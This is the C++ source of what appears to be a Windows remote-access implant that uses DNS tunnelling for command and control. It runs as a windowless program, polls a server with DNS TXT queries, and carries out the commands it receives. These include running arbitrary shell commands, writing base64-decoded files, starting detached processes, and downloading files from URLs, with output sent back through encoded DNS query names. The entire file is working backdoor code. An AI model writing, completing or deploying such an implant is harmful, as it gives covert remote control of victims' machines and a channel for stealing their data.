#include <algorithm>
#include <deque>
#include <fstream>
#include <iostream>
#include <string>
#include <time.h>
#include <vector>
#include <ws2tcpip.h>
#include <windns.h>
#include "Base64.h"
#include "DNSClient.h"
#include "Splitter.h"
#include "Util.h"
using namespace std;

#pragma warning(disable:4996)
#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")

enum Op {
	CHECKIN = 0,
	NOP = 1,
	ASSIGN_ID = 2,
	BUFFER = 3,
	EXEC = 4,
	OUTPUT = 5,
	OUTPUT_DONE = 6,
	WRITEFILE = 7,
	GET_DIR = 8,
	CHANGE_DIR = 9,
	CREATE_PROCESS = 10,
	FETCH_FILE = 11
};

DNSClient::DNSClient()
{
	client_id = 0;
	interval = 2000;
}

void DNSClient::pack_outbound_queue(unsigned char opcode, string msg)
{
	unsigned int bufflen = 43;

	while(msg.size() % 3 != 0)
		msg += " ";

	string sbuf;
	for(auto it = msg.begin(); it != msg.end(); ++it) {
		sbuf += *it;
		if(sbuf.size() == bufflen) {
			string payload(sbuf);
			outbound_queue.push_back(Packet(client_id, opcode, payload));
			sbuf.clear();
		}
	}
	
	if(!sbuf.empty())
		outbound_queue.push_back(Packet(client_id, opcode, sbuf));

	// tell server we're done sending output from last command
	outbound_queue.push_back(Packet(client_id, Op::OUTPUT_DONE, ""));
}

string DNSClient::get_current_dir()
{
	CHAR buf[MAX_PATH];
	if(GetCurrentDirectoryA(MAX_PATH, buf) > 1)
		return string(buf);
	else
		return "Error in GetCurrentDirectory()";
}

string DNSClient::change_dir(const string& newdir)
{
	if(SetCurrentDirectoryA(newdir.c_str()))
		return "Directory changed successfully.";
	else
		return "Directory change failed.";
}

string DNSClient::fetch_file(const string& url)
{
	int pos = url.find_last_of('/') + 1;
	string filename = url.substr(pos, string::npos);
	CHAR path[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, path);
	sprintf(path, "%s\\%s", path, filename.c_str());
	HRESULT res = URLDownloadToFileA(NULL, url.c_str(), path, 0, NULL);
	if(res == S_OK)
		return "Download successful.";
	else
		return "Download failed.";
}

string DNSClient::create_process(const string& path)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if(CreateProcessA(path.c_str(), NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi))
		return "Process created.";
	else
		return "Failed to create process.";
}

void DNSClient::write_file(const string& filename)
{
	string bytes;
	for(auto it = packet_buffer.begin(); it != packet_buffer.end(); ++it)
		bytes += it->data;

	ofstream of(filename.c_str(), ios::out | ios::binary);
	of << de64(bytes);
	of.close();
	packet_buffer.clear();
}

// credit to SO article here
string DNSClient::exec(const string& cmd)
{
    FILE* pipe = _popen(cmd.c_str(), "r");
    if(!pipe) return "ERROR";
    char buffer[4096];
    string result("");
    while(!feof(pipe))
    	if(fgets(buffer, sizeof(buffer), pipe) != NULL)
    		result += buffer;

	_pclose(pipe);

	return string(result.begin(), result.end());
}

void DNSClient::sync()
{
	PDNS_RECORD rec;
	DNS_FREE_TYPE ft = DnsFreeRecordListDeep;

	static string packet_id = "";

	// default to a normal check-in...
	Packet query = Packet(client_id, Op::CHECKIN, packet_id);

	// ...unless there are outbound packets queued
	if(!outbound_queue.empty()) {
		query = outbound_queue.front();
		outbound_queue.pop_front();
	}

	DNS_STATUS ds = DnsQuery(Util::to_wstring(query.flatten()).c_str(), DNS_TYPE_TEXT, DNS_QUERY_NO_MULTICAST | DNS_QUERY_BYPASS_CACHE, NULL, &rec, NULL);
	if(ds == NO_ERROR) {
		// store the TXT records
		vector<string> chunks;

		// loop through TXT records and add to vector for later processing
		PDNS_RECORD p = rec;
		while(p && p->wType == DNS_TYPE_TEXT) {
			chunks.push_back(Util::to_string(p->Data.TXT.pStringArray[0]));
			p = p->pNext;
		}

		// cleanup
		DnsRecordListFree(rec, ft);

		string reassembled_payload = Util::order_chunks(chunks);

		vector<string> tokens = Splitter::split(reassembled_payload, ',');
		unsigned int foreign_packet_id = atoi(tokens[0].c_str());
		unsigned int opcode = atoi(tokens[1].c_str());
		string data;

		packet_id = tokens[0].c_str();

		// if there's a data token, run it through the replace_char function
		// so the client's base64 functions can operate on it, else set to empty
		// (unless it's a URL, in which case don't call replace_char() on it)
		if(tokens.size() > 2) {
			if(opcode != Op::FETCH_FILE)
				data = Util::replace_char(Util::replace_char(tokens[2], '/', '-'), '+', '.');
			else
				data = tokens[2];
		}
		else
			data = "";

		// do stuff based on the opcode
		switch(opcode) {
			case Op::NOP:
				break;

			case Op::ASSIGN_ID:
			{
				client_id = atoi(data.c_str());
				break;
			}

			case Op::EXEC:
			{
				pack_outbound_queue(Op::OUTPUT, exec(de64(data)));
				break;
			}

			case Op::BUFFER:
			{
				packet_buffer.push_back(Packet(client_id, Op::BUFFER, data)); 
				break;
			}

			case Op::WRITEFILE:
			{
				write_file(data);
				break;
			}

			case Op::GET_DIR:
			{
				pack_outbound_queue(Op::OUTPUT, get_current_dir());
				break;
			}

			case Op::CHANGE_DIR:
			{
				pack_outbound_queue(Op::OUTPUT, change_dir(data));
				break;
			}

			case Op::CREATE_PROCESS:
			{
				pack_outbound_queue(Op::OUTPUT, create_process(data));
				break;
			}

			case Op::FETCH_FILE:
			{
				pack_outbound_queue(Op::OUTPUT, fetch_file(data));
				break;
			}
		}
	}
}

int DNSClient::main()
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	while(true) {
		sync();
		if(!outbound_queue.empty())
			Sleep(300);
		else
			Sleep(interval);
	}

	WSACleanup();

	return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	DNSClient c;
	return c.main();
}
